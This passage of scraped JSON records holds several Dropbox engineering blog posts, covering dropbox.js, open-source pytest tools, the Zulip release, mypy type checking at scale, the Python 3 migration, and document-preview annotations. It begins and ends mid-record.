a sense of urgency. Rich Chan built a true Internet Terminal running on JavaScript and Dropbox and a stunning visualizer for the revision history of any text file in your Dropbox. Franklin Ta prototyped a Google Chrome extension that lets you download and upload files straight into / from your Dropbox. David Goldstein worked on a secret project that will make Dropbox apps even more awesome, and used dropbox.js to write a browser-based .zip unpacker for your Dropbox files. Hack week provided an amazing backdrop for the development of dropbox.js . Graham Abbott set up a pod for everyone working with dropbox.js , so it was very easy for us to collaborate and exchange ideas and feedback. Jon Ying sprinkled some design magic on the applications that we developed. The kitchen staff stayed up and prepared hot food for us every night of the week. Dropboxers (including Drew and Arash) came by our pod, looked at our demos, and cheered us on. After hack week, Chris Varenhorst, Dima Ryazanov, and Brian Smith helped me work through some last-minute technical difficulties. Jon Ying gave a makeover to the Checkbox sample app. Albert Ni, Alex Allain, Glara Ahn and Jon Ying helped make this blog post happen. Go forth and hack! I hope you enjoyed reading about the dropbox.js . Above all, I really hope that you will go download the library , and build something amazing with it! I expect that “powered by Dropbox” Web applications will become a great tool for learning Web programming and building class projects. I’ll walk the walk myself this coming winter, when I’ll teach Web Programming at MIT . I look forward to learning about the projects that come out of the next Dropbox hack week, and I’ll be counting how many of them use dropbox.js 🙂 // Tags Application JavaScript Open Source // Copy link Link copied Link copied", "date": "2012-08-31"},
{"website": "Dropbox", "title": "Open Sourcing Pytest Tools", "author": ["Nipunn1313"], "link": "https://dropbox.tech/application/open-sourcing-pytest-tools", "abstract": "At Dropbox, we made the switch from testing with unittest to pytest . We love the features, fixtures, plugins, and customizability of pytest. To further improve our experience, we built a couple of tools ( pytest-flakefinder , unittest2pytest ) for working with pytest and released them as open source. We developed the pytest-flakefinder plugin to help with a common problem, flaky tests. Tests that involve multiple threads, or that depend on certain ordering can often fail at a fairly low rate. A few flaky tests aren’t a big deal, but with thousands of tests, they become a huge issue. We used to literally run pytest in a loop or sometimes just copy paste the test code multiple times to see if we could reproduce the failure. With this plugin we can easily have pytest run the test multiple times in a row. And if you combine it with -x --pdb you can just run it until it fails and get yourself a debugger ready to find out what happened. We now run flakefinder on updated tests in CI to detect flakiness proactively. Another one of the key pytest features we love is assertion rewriting . This pytest feature allows us to see significantly more detailed error messages when asserts fire. In order to take advantage of assert rewriting, the tests must use a raw assert a == b rather than the unittest library’s idiomatic self.assertEqual(a, b) . T est output using unittest style assertions: Copy test/test_login.py:80: in test\r\nself.assertEquals(login.call_count, 1)\r\nE AssertionError: 0 != 1\r\nassert login.call_count == 1 pytest output with raw Python asserts: Copy test/test_login.py:80: in test\r\nE AssertionError: assert 0 == 1\r\nE + where 0 = <MagicMock name='mock.desktop_login.login' id='140671857679512'>.call_count When we made the switch to pytest, we had thousands of existing tests generally using the latter form. Fortunately, pytest is compatible with unittest asserts, so our test suite still passed. However, we weren’t getting the benefits of assertion rewriting everywhere. On top of that, we had different testing practices in our codebase, leading to some confusion. We developed unittest2pytest to convert our existing unittest asserts to pytest rewrite-compatible raw asserts. It’s built on top of the lib2to3 library for automatic code rewriting. This library was able to safely convert most of our code automatically. There were a few hiccups with certain kinds of whitespace and inline commenting, which you can see in our issue reporter. unittest2pytest simply skips over converting things it doesn’t understand. At Dropbox, we developed pytest-flakefinder and unittest2pytest to improve our experience with pytest. These tools are both open source now, so check them out if you use pytest or are considering switching. // Tags Application Python Open Source Pytest // Copy link Link copied Link copied", "date": "2016-03-03"},
{"website": "Dropbox", "title": "Open Sourcing Zulip – a Dropbox Hack Week Project", "author": ["Tabbottdropbox"], "link": "https://dropbox.tech/application/open-sourcing-zulip-a-dropbox-hack-week-project", "abstract": "This year’s Dropbox Hack Week saw some incredible projects take shape – from the talented team that visited Baltimore to research food deserts, to a project to recreate the fictional Pied Piper algorithm from HBO's Silicon Valley. One of the most special elements of Hack Week, though, is that often times we’re able to share these exciting projects openly with our users and our community. At Dropbox, we love and depend on numerous excellent open source projects, and we consider contributing back to the open source community to be vitally important. Popular open source projects that Dropbox has released include the zxcvbn password strength estimator , the Djinni cross-language bridging library , the Hackpad codebase , and the Pyston JIT for Python . During this year’s Hack Week, we reassembled the original team from Zulip (a group chat application optimized for software development teams that was acquired by Dropbox in 2014) to tackle open sourcing Zulip on an ambitious timeline. Today, on behalf of the Zulip team, I’m very excited to announce that we have released Zulip as open source software! We took on this project during Hack Week in order to enable Zulip’s users to enjoy and improve a product they love. Zulip’s users are passionate about the product, and are eager to make their own improvements, and we’re excited to be able to offer them that opportunity. In particular, the Recurse Center has announced plans to work on the Zulip open source project. To make Zulip maximally useful to the world, we have released it under the Apache license, and we’ve released everything, including the server, Android and iOS mobile apps, desktop apps for Mac, Linux and Windows, and the complete Puppet configuration needed to run the Zulip server in production. The world of open source chat has for a long been dominated by IRC and XMPP, both of which are very old and haven’t advanced materially in the last decade. In comparison, Zulip starts with many useful features and integrations expected by software development teams today and has a well-engineered, maintainable codebase for those that are missing. We’re very excited to see what people build on top of Zulip. // Tags Application Hack Week Open Source Zulip // Copy link Link copied Link copied", "date": "2015-09-25"},
{"website": "Dropbox", "title": "Our journey to type checking 4 million lines of Python", "author": ["Jukka Lehtosalo"], "link": "https://dropbox.tech/application/our-journey-to-type-checking-4-million-lines-of-python", "abstract": "Why type checking? Prehistory of mypy Making types official (PEP 484) The migration begins More performance! Even more performance! Reaching 4 million lines Challenges along the way To 5 million lines and beyond Dropbox is a big user of Python. It’s our most widely used language both for backend services and the desktop client app (we are also heavy users of Go, TypeScript, and Rust). At our scale—millions of lines of Python—the dynamic typing in Python made code needlessly hard to understand and started to seriously impact productivity. To mitigate this, we have been gradually migrating our code to static type checking using mypy, likely the most popular standalone type checker for Python. (Mypy is an open source project, and the core team is employed by Dropbox.) Dropbox has been one of the first companies to adopt Python static type checking at this scale. These days thousands of projects use mypy, and things are quite battle tested. It has been a long journey for us to get to this point, and there were a bunch of false starts and failed experiments along the way. This post tells the story of Python static checking at Dropbox, from the humble beginnings as part of my academic research project, to the present day, when type checking and type hinting is a normal thing for numerous developers across the Python community. It is supported by a wide variety of tools such as IDEs and code analyzers. Why type checking? If you have only ever used dynamically typed Python, you might wonder about all the fuss about static typing and mypy. You may even enjoy Python because it has dynamic typing, and the whole thing may be a bit baffling. The key to static type checking is scale: the larger your project, the more you want (and eventually need) it. Once your project is tens of thousands of lines of code, and several engineers work on it, our experience tells us that understanding code becomes the key to maintaining developer productivity. Without type annotations, basic reasoning such as figuring out the valid arguments to a function, or the possible return value types, becomes a hard problem. Here are typical questions that are often tricky to answer without type annotations: Can this function return None ? What is this items argument supposed to be? What is the type of the id attribute: is it int , str , or perhaps some custom type? Does this argument need to be a list, or can I give a tuple or a set? Looking at this fragment with type annotations, all of these questions are trivial to answer: Copy class Resource:\r\n    id: bytes\r\n    ...\r\n    def read_metadata(self, \r\n                      items: Sequence[str]) -> Dict[str, MetadataItem]:\r\n        ... read_metadata does not return None , since the return type is not Optional[…] . The items argument is a sequence of strings. It can’t be an arbitrary iterable. The id attribute is a byte string. In a perfect world, you could expect these to be documented in a docstring, but experience overwhelmingly says that this is often not the case. Even if there is documentation, you can’t rely on it being accurate. Even if there is a docstring, it’s often ambiguous or imprecise, leaving a lot of room for misunderstandings. This problem may become critical for large teams or codebases: Although Python is really good at early and middle stages of a project, at a certain point successful projects and companies that use Python may face a critical decision: “should we rewrite everything in a statically typed language?” A type checker like mypy solves this problem by providing a formal language for describing types, and by validating that the provided types match the implementation (and optionally that they exist). In essence, it provides verified documentation . There are other benefits as well, and these are not trivial either: A type checker will find many subtle (and not so subtle) bugs. A typical example is forgetting to handle a None value or some other special condition. Refactoring is much easier, as the type checker will often tell exactly what code needs to be changed. We don’t need to hope for 100% test coverage, which is usually impractical anyway. We don’t need to study deep stack traces to understand what went wrong. Even in a large project, mypy can often perform a full type check in a fraction of a second. Running tests often takes tens of seconds, or minutes. Type checking provides quick feedback and allows us to iterate faster. We don’t need to write fragile, hard-to-maintain unit tests that mock and patch the world to get quick feedback. IDEs and editors such as PyCharm and Visual Studio Code take advantage of type annotations to provide code completion, to highlight errors, and to support better go to definition functionality—and these are just some of the helpful features types enable. For some programmers, this is the biggest and quickest win. This use case doesn’t require a separate type checker tool such as mypy, though mypy helps keep the annotations in sync with the code. Prehistory of mypy The story of mypy begins in Cambridge, UK, several years before I joined Dropbox. I was looking at somehow unifying statically typed and dynamic languages as part of my PhD research. Inspired by work such as Siek and Taha’s gradual typing and Typed Racket, I was trying to find ways to make it possible to use the same programming language for projects ranging from tiny scripts to multi-million line sprawling codebases, without compromising too much at any point in the continuum. An important part of this was the idea of gradual growth from an untyped prototype to a battle-tested, statically typed product. To a large extent, these ideas are now taken for granted, but it was an active research problem back in 2010. My initial work on type checking didn’t target Python. Instead I used a home-grown, small language called Alore. Here is an example to give you an idea of what it looked like (the type annotations are optional): Copy def Fib(n as Int) as Int\n  if n &lt;= 1\n    return n\n  else\n    return Fib(n - 1) + Fib(n - 2)\n  end\nend Using a simplified, custom language is a common research approach, not least since it makes it quick to perform experiments, and various concerns not essential for research can be conveniently ignored. Production-quality languages tend to be large and have complicated implementations, making experimentation slow. However, any results based on a non-mainstream language are a bit suspect, since practicality may have been sacrificed along the way. My type checker for Alore looked pretty promising, but I wanted to validate it by running experiments with real-world code, which didn’t quite exist for Alore. Luckily, Alore was heavily inspired by Python. It was easy enough to modify the checker to target Python syntax and semantics, making it possible to try type checking open source Python code. I also wrote a source-to-source translator from Alore to Python, and used it to translate the type checker. Now I had a type checker, written in Python, that supported a Python subset! (Certain design decisions that made sense for Alore were a poor fit for Python, which is still visible in parts of the mypy codebase.) Actually, the language wasn’t quite Python at that point: it was a Python variant, because of certain limitations of the Python 3 type annotation syntax. It looked like a mixture of Java and Python: Copy int fib(int n):\r\n    if n <= 1:\r\n        return n\r\n    else:\r\n        return fib(n - 1) + fib(n - 2) One of my ideas at the time was to also use type annotations to improve performance, by compiling the Python variant to C, or perhaps JVM bytecode. I got as far as building a prototype compiler, but I gave up on that, since type checking seemed useful enough by itself. I eventually presented my project at the PyCon 2013 conference in Santa Clara, and I chatted about it with Guido van Rossum, the BDFL of Python. He convinced me to drop the custom syntax and stick to straight Python 3 syntax. Python 3 supports function annotations, so the example could be written like this, as a valid Python program: Copy def fib(n: int) -> int:\r\n    if n <= 1:\r\n        return n\r\n    else:\r\n        return fib(n - 1) + fib(n - 2) Some compromises were necessary (this is why I invented my own syntax in the first place). In particular, Python 3.3, the latest at that point, didn’t have variable annotations. I chatted about various syntax possibilities over email with Guido. We decided to use type comments for variables, which does the job, but is a bit clunky (Python 3.6 gave us a much nicer syntax): Copy products = []  # type: List[str]  # Eww Type comments were also handy for Python 2 support, which has no built-in notion of type annotations: Copy def fib(n):\r\n    # type: (int) -> int\r\n    if n <= 1:\r\n        return n\r\n    else:\r\n        return fib(n - 1) + fib(n - 2) It turned out that these (and other) compromises didn’t really matter too much—the benefits of static typing made users quickly forget the not-quite-ideal syntax. Since type checked Python now had no special syntax, existing Python tools and workflows continued to work, which made adoption much easier. Guido also convinced me to join Dropbox after finishing my PhD, and there begins the core of this story. Making types official (PEP 484) We did the first serious experiments with mypy at Dropbox during Hack Week 2014. Hack Week is a Dropbox institution—a week when you can work on anything you want! Some of the most famous Dropbox engineering projects can trace their history back to a Hack Week. Our take-away was that using mypy looked promising, though it wasn’t quite ready for wider adoption yet. An idea was floated around that time to standardize the type hinting syntax in Python. As I mentioned above, starting from Python 3.0, it has been possible to write function type annotations in Python, but they were just arbitrary expressions, with no designated syntax or semantics. They are mostly ignored at runtime. After Hack Week, we started work on standardizing the semantics, and it eventually resulted in PEP 484 (co-written by Guido, Łukasz Langa, and myself). The motivation was twofold. First, we hoped that the entire Python ecosystem would embrace a common approach for type hinting (Python term for type annotations), instead of risking multiple, mutually incompatible approaches. Second, we wanted to openly discuss how to do type hinting with the wider Python community, in part to avoid being branded heretics. As a dynamic language that is famous for “duck typing”, there was certainly some initial suspicion about static typing in the community, but it eventually subsided when it became clear that it’s going to stay optional (and after people understood that it’s actually useful). The eventually accepted type hinting syntax was quite similar to what mypy supported at the time. PEP 484 shipped with Python 3.5 in 2015, and Python was no longer (just) a dynamic language. I like to think of this as a big milestone for Python. The migration begins We set up a 3-person team at Dropbox to work on mypy in late 2015, which included Guido, Greg Price, and David Fisher. From there on, things started moving pretty rapidly. An immediate obstacle to growing mypy use was performance. As I implied above, an early goal was to compile the mypy implementation to C, but this idea was scrapped (for now). We were stuck with running on the CPython interpreter, which is not very fast for tools like mypy. (PyPy, an alternative Python implementation with a JIT compiler, also didn’t help.) Luckily, there were algorithmic improvements to be had. The first big major speedup we implemented was incremental checking . The idea is simple: if all dependencies of a module are unchanged from the previous mypy run, we can use data cached from the previous run for the dependencies, and we only need to type check modified files and their dependencies. Mypy goes a bit further than that: if the external interface of a module hasn’t changed, mypy knows that other modules that import the module don’t need to be re-checked. Incremental checking really helps when annotating existing code in bulk, as this typically involves numerous iterative mypy runs, as types are gradually inserted and refined. The initial mypy run would still be pretty slow, since many dependencies would need to be processed. To help with that, we implemented remote caching . If mypy detects that your local cache is likely to be out of date, mypy downloads a recent cache snapshot for the whole codebase from a centralized repository. It then performs an incremental build on top of the downloaded cache. This gave another nice performance bump. This was a period of quick organic adoption at Dropbox. By the end of 2016, we were at about 420,000 lines of type-annotated Python. Many users were enthusiastic about type checking. The use of mypy was spreading quickly across teams at Dropbox. Things were looking good, but there was still a lot of work to be done. We started running periodic internal user surveys to find pain points and to figure out what work to prioritize (a habit that continues to this day). Two requests were clearly at the top: more type checking coverage, and faster mypy runs. Clearly our performance and adoption growth work was not yet done. We doubled down on these tasks. More performance! Incremental builds made mypy faster, but it still wasn’t quite fast . Many incremental runs took about a minute. The cause is perhaps not surprising to anybody who has worked on a large Python codebase: cyclic imports. We had sets of hundreds of modules that each indirectly import each other. If any file in an import cycle got changed, mypy would have to process all the files in the cycle, and often also any modules that imported modules from this cycle. One of these cycles was the infamous “tangle” that has caused much grief at Dropbox. At one point it contained several hundred modules, and many tests and product features imported it, directly or indirectly. We looked at breaking the tangled dependencies, but we didn’t have the resources to do that. There was just too much code we weren’t familiar with. We came up with an alternative approach—we were going to make mypy fast even in the presence of tangles. We achieved this through the mypy daemon . The daemon is a server process that does two interesting things. First, it keeps information about the whole codebase in memory, so that each mypy run doesn’t need to load cache data corresponding to thousands of import dependencies. Second, it tracks fine-grained dependencies between functions and other constructs. For example, if function foo calls function bar, there is a dependency from bar to foo. When a file gets changed, the daemon first processes just the changed file in isolation. It then looks for externally visible changes in that file, such as a changed function signature. The daemon uses the fine-grained dependencies to only recheck those functions that actually use the changed function. Usually this is a small number of functions. Implementing all this was a challenge, since the original implementation was heavily geared towards processing things a file at a time. We had to deal with numerous edge cases around what needs to be reprocessed when various thing change, such as when a class gets a new base class. After a lot of painstaking work and sweating the details, we were able to get most incremental runs down to a few seconds, which felt like a great victory. Even more performance! Together with remote caching that I discussed above, mypy daemon pretty much solved the incremental use case, where an engineer iterates on changes to a small number of files. However, worst-case performance was still far from optimal. Doing a clean mypy build would take over 15 minutes, which was much slower than we were happy with. This was getting worse every week, as engineers kept writing new code and adding type annotations to existing code. Our users were still hungry for more performance, and we were happy to comply. We decided to get back to one of the early ideas behind mypy—compiling Python to C. Experimenting with Cython (an existing Python to C compiler) didn’t give any visible speed-up, so we decided to revive the idea of writing our own compiler. Since the mypy codebase (which is written in Python) was already fully type annotated, it seemed worth trying to use these type annotations to speed things up. I implemented a quick proof-of-concept prototype that gave performance improvement of over 10x in various micro-benchmarks. The idea was to compile Python modules to CPython C extension modules, and to turn type annotations into runtime type checks (normally type annotations are ignored at runtime and only used by type checkers). We effectively were planning to migrate the mypy implementation from Python to a bona fide statically typed language, which just happens to look (and mostly behave) exactly like Python. (This sort of cross-language migration was becoming a habit—the mypy implementation was originally written in Alore, and later a custom Java/Python syntax hybrid.) Targeting the CPython extension API was key to keeping the scope of the project manageable. We didn’t need to implement a VM or any libraries needed by mypy. Also, all of the Python ecosystem and tools (such as pytest) would still be available for us, and we could continue to use interpreted Python during development, allowing a very fast edit-test cycle without having to wait for compiles. This sounded like both having your cake and eating it, which we quite liked! The compiler, which we called mypyc (since it uses mypy as the front end to perform type analysis), was very successful. Overall we achieved around 4x speedup for clean mypy runs with no caching. The core of the mypyc project took about 4 calendar months with a small team, which included Michael Sullivan, Ivan Levkivskyi, Hugh Han, and myself. This was much less work than what it would have taken to rewrite mypy in C++ or Go, for example, and much less disruptive. We also hope to make mypyc eventually available for Dropbox engineers for compiling and speeding up their code. There was some interesting performance engineering involved in reaching this level of performance. The compiler can speed up many operations by using fast, low-level C constructs. For example, calling a compiled function gets translated into a C function call, which is a lot faster than an interpreted function call. Some operations, such as dictionary lookups, still fall back to general CPython C API calls, which are only marginally faster when compiled. We can get rid of the interpretation overhead, but that only gives a minor speed win for these operations. We did some profiling to find the most common of these “slow operations”. Armed with this data, we tried to either tweak mypyc to generate faster C code for these operations, or to rewrite the relevant Python code using faster operations (and sometimes there was nothing we could easily do). The latter was often much easier than implementing the same transformation automatically in the compiler. Longer term we’d like to automate many of these transformations, but at this point we were focused on making mypy faster with minimal effort, and at times we cut a few corners. Reaching 4 million lines Another important challenge (and the second most popular request in mypy user surveys) was increasing type checking coverage at Dropbox. We tried several approaches to get there: from organic growth, to focused manual efforts of the mypy team, to static and dynamic automated type inference. In the end, it looks like there is no simple winning strategy here, but we were able to reach fast annotation growth in our codebases by combining many approaches. As a result, our annotated line count in the biggest Python repository (for back-end code) grew to almost 4 million lines of statically typed code in about three years. Mypy now supports various kinds of coverage reports that makes it easy to track our progress. In particular, we report sources of type imprecision, such as using explicit, unchecked Any types in annotations, or importing 3rd party libraries that that don’t have type annotations. As part of our effort to improve type checking precision at Dropbox, we also contributed improved type definitions (a.k.a. stub files) for some popular open-source libraries to the centralized Python typeshed repository. We implemented (and standardized in subsequent PEPs) new type system features that enable more precise types for certain idiomatic Python patterns. A notable example is TypedDict, which provides types for JSON-like dictionaries that have a fixed set of string keys, each with a distinct value type. We will continue to extend the type system, and improving support for the Python numeric stack is one of the likely next steps. Here are highlights of the things we’ve done to increase annotation coverage at Dropbox: Strictness. We gradually increased strictness requirements for new code. We started with advice from linters asking to write annotations in files that already had some. We now require type annotations in new Python files and most existing files. Coverage reporting. We send weekly email reports to teams highlighting their annotation coverage and suggesting the highest-value things to annotate. Outreach. We gave talks about mypy and chatted with teams to help them get started. Surveys. We run periodic user surveys to find the top pain points and we go to great lengths to address them (as far as inventing a new language to make mypy faster!). Performance. We improved mypy performance through mypy daemon and mypyc (p75 got 44x faster!) to reduce friction in annotation workflows and to allow scaling the size of the type checked codebase. Editor integrations. We provided integrations for running mypy for editors popular at Dropbox, including PyCharm, Vim, and VS Code. These make it much easier to iterate on annotations, which happens a lot when annotating legacy code. Static analysis. We wrote a tool to infer signatures of functions using static analysis. It can only deal with sufficiently simple cases, but it helped us increase coverage without too much effort. Third party library support. A lot of our code uses SQLAlchemy, which uses dynamic Python features that PEP 484 types can’t directly model. We made a PEP 561 stub file package and wrote a mypy plugin to better support it (it’s available as open source). Challenges along the way Getting to 4M lines wasn’t always easy and we had a few bumps and made some mistakes along the way. Here are some that will hopefully prevent a few others from making the same mistakes. Missing files. We started with only a small number of files in the mypy build. Everything outside the build was not checked. Files were implicitly added to the build when the first annotations were added. If you imported anything from a module outside the build, you’d get values with the Any type, which are not checked at all. This resulted in a major loss of typing precision, especially early in the migration. This still worked surprisingly well, though it was a typical experience that adding a file to the build exposed issues in other parts of the codebase. In the worst case, two isolated islands of type checked code were being merged, and it turned out that the types weren't compatible between the two islands, necessitating numerous changes to annotations! In retrospect, we should have added basic library modules to the mypy build much earlier to make things smoother. Annotating legacy code. When we started, we had over 4 million lines of existing Python code. It was clear that annotating all of that would be non-trivial. We implemented a tool called PyAnnotate that can collect types at runtime when running tests and insert type annotations based on these types—but it didn’t see much adoption. Collecting the types was slow, and generated types often required a lot of manual polish. We thought about running it automatically on every test build and/or collecting types from a small fraction of live network requests, but decided against it as either approach is too risky. In the end, most of the code was manually annotated by code owners. We provide reports of highest-value modules and functions to annotate to streamline the process. A library module that is used in hundreds of places is important to annotate; a legacy service that is being replaced much less so. We are also experimenting with using static analysis to generate type annotations for legacy code. Import cycles. Previously I mentioned that import cycles (the “tangle”) made it hard to make mypy fast. We also had to work hard to make mypy support all kinds of idioms arising from import cycles. We recently finished a major redesign project that finally fixes most import cycle issues. The issues actually stem from the very early days of Alore, the research language mypy originally targeted. Alore had syntax that made dealing with import cycles easy, and we inherited some limitations from the simple-minded implementation (that was just fine for Alore). Python makes dealing with import cycles not easy, mainly because statements can mean multiple things. An assignment might actually define a type alias, for example, and mypy can’t always detect that until most of an import cycle has been processed. Alore did not have this kind of ambiguity. Early design decisions can cause you pain still many years later! To 5 million lines and beyond It has been a long journey from the early prototypes to type checking 4 million lines in production. Along the way we’ve standardized type hinting in Python, and there is now a burgeoning ecosystem around Python type checking, with IDE and editor support for type hints, multiple type checkers with different tradeoffs, and library support. Even though type checking is already taken for granted at Dropbox, I believe that we are still in early days of Python type checking in the community, and things will continue to grow and get better. If you aren’t using type checking in your large-scale Python project, now is a good time to get started—nobody who has made the jump I’ve talked to has regretted it. It really makes Python a much better language for large projects. Are you interested in working on Developer Infrastructure at scale? We’re hiring ! // Tags Application Python Open Source Mypy // Copy link Link copied Link copied", "date": "2019-09-05"},
{"website": "Dropbox", "title": "Incrementally migrating over one million lines of code from Python 2 to Python 3", "author": ["Cary Yang"], "link": "https://dropbox.tech/application/incrementally-migrating-over-one-million-lines-of-code-from-python-2-to-python-3", "abstract": "The Pioneers Python 3rd time’s the charm Learnings (tl;dr) Acknowledgements Stay tuned… The Dropbox desktop client is relied on by millions of users across the world to save their most important files and keep them in sync across their devices. Weighing in at over 1 million lines of Python logic, we had a massive surface area for potential issues in our migration from Python 2 to Python 3. In this process, we knew that we had to be worthy of the trust that users place in Dropbox and keep their information safe. Over the last few months, we’ve explored why and how we rolled out our Python 3 migration , and how we ensured that the resulting application was reliable . In this piece, we’ll take a brief walk through the history of Python 3 in our desktop client, and then dive into the details of how we pulled off a gradual migration while allowing ongoing development. The Pioneers Like many other great ideas at Dropbox, the effort to migrate the desktop client to Python 3 began during one of our annual Hack Weeks . The phrase thrown around internally to describe this week-long event is “getting back to our roots” —five days where everyone at Dropbox puts aside their daily responsibilities to work in small, fast-moving teams to tackle exciting or interesting problems. Hack Week 2015 This was the start of it all—an intrepid team of Dropboxers decided to see how far they could take Python 3 in the desktop client. In the spirit of Hack Week, they managed to hack together a version of the desktop client that could sign in and sync some files while running Python 3. Problem solved? Not quite. Unfortunately, it was clear that many features were completely broken by the upgrade. Some changes that were compatible with both Python 2 and Python 3 were merged, however, much of the work was eventually thrown away. Hack Week 2016 A new team formed during this Hack Week with the goal of making more permanent steps towards Python 3. Armed with Mypy , a static type-checking tool that we had adopted in the interim year, they made substantial strides towards enabling the Python 3 migration: Ported our custom fork of Python to version 3.5 Upgraded some Python dependencies to Python 3-compatible versions, and forked some others (e.g. babel ) Modified some Dropbox client code to be Python 3 compatible Set up automated jobs in our continuous integration (CI) to run the existing unit tests with the Python 3 interpreter, and Mypy type-checking in Python 3 mode Crucially, the automated tests meant that we could be certain that the limited Python 3 compatibility that existed would not have regressed when the project was picked up again. Python 3rd time’s the charm By early 2017, it had become clear that upgrading Python versions was in the critical path for several toolchain upgrades, and the multi-month-long project to migrate to Python 3 was officially staffed. Prerequisites Before we could begin working on migrating any of our application logic, we had to ensure that we could load the Python 3 interpreter and run until the entry point of the application. In the past, we had used “freezer” scripts to do this for us. However, none of these had support for Python 3 around this time, so in late 2016, we built a custom, more native solution which we internally referred to as “Anti-freeze” (more on that in the initial Python 3 migration blog post ). With that taken care of, we were ready to get started on the application itself. 1. Incrementally enabling unit tests and type-checking As a starting point, our first goal was to enable all unit tests and Mypy type-checking under Python 3 to validate that we had some measure of compatibility with Python 3. All unit tests were initially disabled under Python 3 with module-level pytest.skip function calls. We then went through each test file one-by-one, ran it under Python 3, fixed any issues in either the application logic itself or the test, and then removed the skip . Similarly, we had an explicit blacklist of files that did not pass under Python 3 Mypy that we worked through file-by-file. By enabling Python 3 Mypy across the codebase, we were able to take advantage of the company-wide push to add more Mypy typing (from 35% coverage to 63% coverage when this project ended!) and enforce types compatible with both Python 2 and Python 3 to prevent the hybrid syntax from regressing. Specifically, Mypy was able to catch and warn about some type issues that would otherwise silently produce the incorrect result on Python 3, such as our most common issue: the behavioral difference between str , bytes , and unicode in the two Python versions. Strings: str and bytes and unicode , oh my! A brief summary: in Python 2, str is an alias for bytes , and unicode is the type for Unicode strings; in Python 3, str is the type for Unicode strings, bytes is for byte-strings, and unicode doesn’t exist. Besides the differently named types, there are also significant semantic differences in how Python treats each of these types across versions (enough that presentations have been given on just this topic!). For brevity, we’ll omit a discussion here, but a thorough understanding of the differences is highly recommended for anyone working on migrating a project from Python 2 to Python 3. The primary issue we ran into involved the various locations that we serialize our in-memory representation of various data. Because the interfaces typically accepted ‘string-like’ objects, we would happily call str on a byte-string, which would result in \"b'string contents'\" in Python 3. Our discovery of these issues were mostly driven by a combination of stronger Mypy typing (to be explicit about when types were bytes vs. Text ), and failures from the unit test suite. A special note about from __future__ import unicode_literals On the surface, this seems convenient, as it implements the Python 3 string literal behavior in Python 2. However, we found that this was confusing to use in just parts of the codebase, and not possible to add to every file overnight. It wasn’t possible for us to directly add this import across the codebase because it can change the runtime behavior in breaking ways, especially since many Python standard library functions require a str to be passed on both Python 2 and Python 3. Including this import in just some files resulted in confusion for developers, as it’s disorienting to follow some logic across files and have the string literal type change because of an import at the top of the file. 2. ‘Straddling’ Python 2 and Python 3 After we had unit tests passing and Mypy type-checking, we could begin trying out the application end-to-end. We first did this within our team, fixing any obvious issues with the basic functionality, and then organized “bug bashes” with the teams that owned each part of the Dropbox client to test their features in more detail and uncover any more subtle regressions. Then, it came time to dogfood the Python 3 version of the application with our internal users. To allow us to safely and quickly move our users back to Python 2 if we discovered a critical issue, we built Hydra , which allowed us to choose to run either the Python 2 or Python 3 interpreter when the desktop client started up. During this time, we had to ensure that all of the application logic was written with a hybrid Python 2/3 syntax (‘straddling’ both Python 2 and Python 3) to allow us to continue shipping Python 2 builds to the majority of our users while we were testing Python 3 internally. 3. Letting it bake To ensure that we met our high quality bar, we kept the desktop client in this hybrid state for an extended stabilization period—first for just our internal build, and then eventually our Beta population as well. During this period, we relied on reports from our revamped aggregate crash reporting pipeline to alert us of any issues that occurred. This eventually led to the discovery of some fun issues, such as this one in Python itself . After about 7 months in this period, we were confident that the Python 3 version of the application met our quality bar, and expanded the scope of the rollout to include our Stable channel and removed Python 2 from our application binary. This marked the end of our Python version migration! Learnings (tl;dr) Unit tests and typing are invaluable. We were able to discover the majority of the compatibility issues early on through our unit tests and static Mypy type-checking, and they allowed us to create a clear and concurrently actionable list of issues to fix. String encoding in Python is hard. Python 3 is significantly more sane in this respect, and if your Python logic handles Unicode strings, this is in and of itself a good reason to switch from Python 2 to Python 3. However, the drastic changes made in Python 3 to fix string behavior means that most issues you’ll find during the migration will be related to the difference in how strings are handled between the versions. Incrementally migrate to Python 3 for great profit. Because we preserved Python 2 compatibility throughout this project, we could continue to allow feature development and ship Python 2 versions of the application, while gradually increasing our Python 3 compatibility until we were comfortable enough to switch over. Acknowledgements Special thanks to Max Belanger for editing advice throughout the writing process of this post, John Lai for some historical context on the earliest Python 3 attempts at Dropbox, and everyone who contributed on this project (a full list is in the original blog post !). Stay tuned… If you’re interested in hearing some of our greatest war stories from this process in more detail, there’s one more post in this series coming soon to a Dropbox tech blog near you! Interested? If the kind of problems we’re tackling are interesting to you, and you want to take on the challenges of desktop Python development at scale, consider joining us! // Tags Application Hack Week Python Open Source Desktop Client // Copy link Link copied Link copied", "date": "2019-02-06"},
{"website": "Dropbox", "title": "Annotations on Document Previews", "author": ["Lauraharrisneal"], "link": "https://dropbox.tech/application/annotations-on-document-previews", "abstract": "Introduction FileViewer architecture Annotations Integrating annotations with the existing framework Option 1: All components in the PDF.js iframe Option 2: All components in the parent FileViewer Option 3: Hybrid solution Example action flowing through whole system iframe events FileViewer events Conclusion Appendix: Coordinate translation between iframe and FileViewer Introduction Location-specific feedback has always been fundamental to collaboration. At Dropbox, we’ve recognized this need and implemented annotations on document previews . Our goal was to allow users to provide focused and clear feedback by drawing rectangles and highlighting text on their documents. We ran into a few main challenges along the way: How do we ensure annotations can be drawn and rendered accurately on any kind of document, with any viewport size, and using any platform? How can we maintain isolation of user documents for security? How can we keep performance smooth and snappy? Below, I’m going to answer these questions and dive a bit deeper into how annotations work at Dropbox. FileViewer architecture Before jumping into the annotations library, let’s take a look at our existing file preview architecture. On the web, files are previewed by our FileViewer module, which behaves differently depending on file type. Images and text files are relatively simple, and can be inserted directly into the DOM. Previewing more complicated files (e.g. PDFs, Microsoft Office files, and Adobe Illustrator files), requires first generating a PDF preview on the back-end and then displaying that preview in an iframe within the FileViewer . User documents are incredibly variable and could potentially contain malicious content. Therefore, complicated filetypes with generated previews are shown in an iframe. Since the iframe’s source comes from a different domain, its context doesn’t have direct access to the main site’s DOM, CSS styles, JavaScript functions, cookies, or local storage. Thus, the user-generated content is effectively isolated. Within that iframe, Dropbox uses PDF.js to display the generated previews. To maintain isolation, PDF.js knows nothing about the user and has the sole purpose of rendering a PDF at a given URL. Using PDF.js in an iframe has some additional benefits besides increased security: it keeps the code simple and allows us to benefit from an existing technology with a large user base and continuous upgrades. While this structure worked very well for vanilla read-only document previews, it provided some substantial challenges when it came time to enhance previews with inline annotations. We now needed to do more than simply view a document, so we had to establish communication between PDF.js and our FileViewer . This communication happens with FrameMessenger , a Dropbox proprietary message-passing module which sends information in JSON. Although annotations must work for arbitrary file types and platforms, the following discussion will use PDF previews on the web as an illustrative 